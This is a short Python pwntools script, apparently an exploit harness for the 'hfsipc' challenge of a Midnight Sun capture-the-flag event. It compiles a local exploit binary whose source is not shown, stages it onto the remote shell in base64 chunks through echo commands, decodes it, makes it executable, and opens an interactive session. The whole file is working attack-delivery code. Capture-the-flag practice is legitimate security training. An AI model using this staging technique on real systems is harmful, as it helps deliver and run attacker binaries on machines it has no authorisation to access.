#!/usr/bin/python
from pwn import *
import sys, base64

HOST = "hfsipc-01.play.midnightsunctf.se"
PORT = 8192

def compile():
    log.info("Compile")
    os.system("musl-gcc -w -s -static -o3 pwn.c -o pwn")

def upload():
    p = log.progress("Upload")

    with open("pwn", "rb") as f:
        data = f.read()

    encoded = base64.b64encode(data)

    for i in range(0, len(encoded), 300):
        p.status("%d / %d" % (i, len(encoded)))
        r.sendline("echo %s >> benc" % (encoded[i:i+300]))
        r.recvuntil("$ ")

    r.sendline("cat benc | base64 -d > bout")
    r.recvuntil("$ ")
    r.sendline("chmod +x bout")
    r.recvuntil("$ ")
    p.success()

def exploit(r):
    r.recvuntil("$ ")

    compile()
    upload()

    r.interactive()
    
    return

if __name__ == "__main__":
    if len(sys.argv) > 1:
        r = remote(HOST, PORT)
        exploit(r)
    else:
        r = process("./chall")
        print util.proc.pidof(r)
        pause()
        exploit(r)
